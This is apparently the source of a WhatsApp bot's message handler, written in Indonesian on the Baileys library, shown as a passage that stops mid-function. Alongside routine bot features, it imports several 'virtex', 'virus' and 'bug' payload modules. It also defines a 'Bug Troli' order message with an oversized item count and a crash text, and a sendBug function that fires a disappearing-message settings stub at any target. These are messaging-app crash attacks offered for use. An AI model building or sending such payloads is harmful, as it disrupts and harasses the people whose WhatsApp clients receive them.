//SUBSCRIBE HERMAN CHANEL
const
	{
	    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		waChatKey,
		mentionedJid,
		processTime,
		prepareMessageFromContent, 
		relayWAMessage
	} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const hx = require('hxz-api')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const brainly = require('brainly-scraper')
const ig = require('insta-fetcher')
const cheerio = require('cheerio')
const fromData = require('form-data')
const os = require('os')
const translate = require('@vitalets/google-translate-api')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const yts = require( 'yt-search')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api")
const crypto = require('crypto')
const emoji = new EmojiAPI()
const speed = require('performance-now')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { fetchJson } = require('./lib/fetcher')
const { uploadimg, upload } = require('./lib/uploadimg')
const { webp2mp4File } = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js')
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { pinterest } = require('./lib/pinterest')
const { virtexapi } = require('./lib/virtexapi.js');
const { virtau } = require('./lib/virtau.js');
const { virlock } = require('./lib/virlock.js')
const { btbug } = require('./lib/btbug.js');
const { virtexx } = require('./lib/virtexx.js');
const { vapi } = require('./lib/vapi.js');
const { wasap } = require('./lib/wasap.js');
const { ngazap } = require('./lib/ngazap.js');
const { virtex } = require('./lib/virtex.js');
const { virchan } = require('./lib/virchan.js');
const { virshin } = require('./lib/virshin.js');
const { virus2 } = require('./lib/virus2.js');
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot.js')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const client = new WAConnection()

// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const exif = new Exif()

// DATABASE
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
const antivirtex = JSON.parse(fs.readFileSync("./database/antivirtex.json"))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
fake = "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗";
virgam = fs.readFileSync("./media/virgam.jpeg")
virgam2 = fs.readFileSync("./media/virgam2.jpeg")
katalog = fs.readFileSync("./media/katalog.jpeg")
autorespon = false
autoread = true
playmusic = false
autovn = true
autotype = false
antidelete = true
menusimpel = false
menuall = false
baterai = {
battery: "" || "Not detected",
isCharge: "" || false
}
offline = false
publik = true
bugc = true
waktuafk = 'Nothing'
alasanafk = 'Nothing'
NamaBot = settings.NamaBot
NomorOwner = settings.NomorOwner
NomorOwner2 = settings.NomorOwner2
NamaOwner = settings.NamaOwner
pulsa = settings.Pulsa
dana = settings.Dana
gopay = settings.Gopay
multi = true
nopref = false

// APIKEY
HunterApi = settings.HunterApi
YuzApi = 'Yuzzu'
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('10m') }
    afk.push(obj)
    fs.writeFileSync('./database/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./database/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}
const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
module.exports = kurr = async (kurr, mek) => {
try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
	    if (!mek.message) return
	    if (mek.key && !mek.key.remoteJid == 'status@broadcast') return
	    if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3 && bugc && !mek.key.fromMe) {
		nums = mek.participant
        longkapnye = "\n".repeat(420)
        tekuss = `\`\`\`TANDAI TELAH DIBACA !!!\`\`\`${longkapnye}\`\`\`@⁨${nums.split('@')[0]} Terdeteksi Telah Mengirim Bug, @⁨${nums.split('@')[0]} Akan Dikick!\`\`\`\n`
        kurr.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
        kurr.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
        }
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = kurr.user
		m = simple.smsg(kurr, mek)
		const antibot = m.isBaileys
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		kurr.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
	    if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = fs.readFileSync('./thumb.jpg')
		cmhit.push(command)
        mess = {
			wait: 'Wait a minute',
			success: 'Success',
			error: {
				stick: 'Cannot access videos!',
				Iv: 'Invalid link!',
                api: 'Error'
			},
			only: {
				group: 'Only for within the group!',
				ownerG: 'Only for group owners!',
				ownerB: 'Only for bot owners!',
				admin: 'Only for group admins!',
				Badmin: 'Make the bot a group admin!'
			}
		}
		const botNumber = kurr.user.jid
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? kurr.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? kurr.user.jid : kurr.contacts[mek.sender]
        const pushname = mek.key.fromMe ? kurr.user.name : !conts ? '-' : conts.notify || conts.vname || conts.name || '-'   
		const totalchat = await kurr.chats.all()
		const groupMetadata = isGroup ? await kurr.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumber.includes(sender)
		const isNsfw = isGroup ? nsfw.includes(from) : false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		const isAntiWame = isGroup ? antiwame.includes(from) : false
		 const isAntivirtex = isGroup ? antivirtex.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAuto = isGroup ? autosticker.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
		const q = args.join(' ')

const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
		if (antibot === true) return
		const katalog = (teks) => {
             res = kurr.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             kurr.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = kurr.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/LZlPZEVqK3KGKgL5WVtV2h', "groupName": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`, "footerText": "*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
            kurr.relayWAMessage(grup)
        }
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
		try {
		pporang = await kurr.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		const pporigi = fs.readFileSync('./thumb.jpg')
		const sekarang = new Date().getTime();
			//-
			//WAKTU
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Midnight 🌚"; break;
                case 1: jamss = "Midnight 🌚"; break;
                case 2: jamss = "Midnight 🌚"; break;
                case 3: jamss = "Midnight 🌔"; break;
                case 4: jamss = "Midnight 🌔"; break;
                case 5: jamss = "Dawn 🌄"; break;
                case 6: jamss = "Morning 🌄"; break;
                case 7: jamss = "Morning 🌄"; break;
                case 8: jamss = "Morning ☀️"; break;
                case 9: jamss = "Morning ☀️"; break;
                case 10: jamss = "Morning ☀️"; break;
                case 11: jamss = "Afternoon 🌞"; break;
                case 12: jamss = "Zuhur 🌞"; break;
                case 13: jamss = "Afternoon 🌞"; break;
                case 14: jamss = "Afternoon 🌞"; break;
                case 15: jamss = "Asar 🌞"; break;
                case 16: jamss = "Afternoon ☀️"; break;
                case 17: jamss = "Evening 🌄"; break;
                case 18: jamss = "Maghrib 🌄"; break;
                case 19: jamss = "Isha 🌙"; break;
                case 20: jamss = "Night 🌙"; break;
                case 21: jamss = "Night 🌙"; break;
                case 22: jamss = "Midnight 🌙"; break;
                case 23: jamss = "Midnight 🌚"; break;
            }
            var tampilUcapan = "" + jamss;
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
		const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
                                        }
if(time2 < "19:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
                                         }
if(time2 < "18:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/08/7b/81087b2e732dc0e25d8875b135d579b9.jpg')
                                         }
if(time2 < "15:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
                                         }
if(time2 < "11:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
                                         }
if(time2 < "06:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/15/8e/ea/158eea299c01433aae6744599d2fdc3a.jpg')
}
const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": imageTime //Gambarnye
					},
					"title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
					"description": `${tampilUcapan} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${tampilUcapan} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
// TROLI
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${tampilUcapan} ${pushname}`, //Kasih namalu
                            orderTitle: `${tampilUcapan} ${pushname}`,
                            thumbnail: dfrply, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
// LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// DOCUMENT
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${tampilUcapan} ${pushname}`, 
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
// GROUPINVITE
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${tampilUcapan} ${pushname}`,
			"groupName": `${tampilUcapan} ${pushname}`, 
            "caption": `${tampilUcapan} ${pushname}`, 
            'jpegThumbnail': dfrply
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'gifPlayback': 'true', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  } 
	//Bug Troli
const troli = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '3184312811796096', itemCount: '9999999', status: 'INQUIRY', surface:  'CATALOG', message: `${virtau()}`, orderTitle: '⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗', sellerJid: '6282134110253@s.whatsapp.net', token: 'AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg==' }}}
// TEXT WITH THUMBNAIL
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${tampilUcapan} ${pushname}`,
                 "title": `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
	                  } 
                     }
// VN
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "99999",
                 "ptt": "true"
                        }
	                  } 
                     }
const fonce = {
key : {
         participant : '0@s.whatsapp.net'
     },
	"message": {
					"viewOnceMessage": {
						"message": {
							"imageMessage": {
								"url": "https://mmg.whatsapp.net/d/f/Ar5T7V7eN5j_nSw-xgy_EVdIOsuqgg_Duto86e4fJ-Qw.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "iunlEh4hXYeza7nrfdXDhHhdbm+MtierOu/CFRsjIGU=",
								"fileLength": "126766",
								"height": 720,
								"width": 1520,
								"mediaKey": "HV8K4Wvi+CrBlbcDvKppBHRC1nt6CDRy7fSiCOTeubI=",
								"fileEncSha256": "WHzCrgzOdpLi85bhhIikQR+ZZmXz82Si+D5X+LSZt/w=",
								"directPath": "/v/t62.7118-24/21226550_1161558544334956_2350569904574046255_n.enc?ccb=11-4&oh=37804c40c439a259151c529674f87b6f&oe=61643631",
								"mediaKeyTimestamp": "1631439562",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAtAAADAQEAAAAAAAAAAAAAAAAAAQMCBAEBAQEBAAAAAAAAAAAAAAAAAgABA//aAAwDAQACEAMQAAAA4XSnKgugrndtKWNc5MRDu5hzeKEltEa0qdELkNDytQ5oYbZqC3ABzmAs/8QAIBAAAgICAgIDAAAAAAAAAAAAAAECESFBAxMQMRIiUf/aAAgBAQABPwCpSFCR1s6mdWTqoVJHLCMo5ElEjHfjLKMRd0YGTbRmrM0SklQ+RRyiLU42imhKmMnEf1sTjR7HG46PhVUxSXj2NHLHBA2fpoejj2bFs5PTP//EABwRAAIDAAMBAAAAAAAAAAAAAAABAhEhEEFRA//aAAgBAgEBPwC36b6S+ckk3dF1zg233gyLwQxcR7P/xAAYEQADAQEAAAAAAAAAAAAAAAABEBExAP/aAAgBAwEBPwCOPXGNKPf/2Q==",
								"scansSidecar": "yxwTOibSDB4HaqsKZaXPmYqNRrwT7jTEi7E4nq7f4TRY3tfEMbiwnA==",
								"scanLengths": [
									11892,
									53069,
									23444,
									38361
								],
								"midQualityFileSha256": "yXjSDT06QCxfTzL4Wi7F0rxdQ3dTTjb8+CcBQV0fces=",
								"viewOnce": true
							}
						}
					}
				}
			}
const sendBug = async (target) => {
      await kurr.relayWAMessage(
        kurr.prepareMessageFromContent(
          target,
          kurr.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
    //But verify
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}

const isRegistered = checkRegisteredUser(sender)

const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
kurr.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebelum Mengakses Bot Verify Terlebih Dahulu Ya `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak```'
const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `🌹 *VERIFY* 🌹 `,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

      const getpc = async function(totalchat){
   let pc = []
   let a = []
   let b = []
   for (c of totalchat){
      a.push(c.jid)
   }
   for (d of a){
      if (d && !d.includes('g.us')){
         b.push(d)
      }
   }
   return b
}
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
kurr.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await kurr.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
kurr.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await kurr.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
kurr.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await kurr.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
kurr.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
if (!mek.key.remoteJid.endsWith('@g.us') && offline){
			if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
			heheh = ms(Date.now() - waktuafk)
		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
			}
		}
		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
			if (!mek.key.fromMe){
				if (mek.message.extendedTextMessage != undefined){
					if (mek.message.extendedTextMessage.contextInfo != undefined){
						if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
				for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
					if (ment === kurr.user.jid){
                        if (isAfk(mek.key.remoteJid)) return
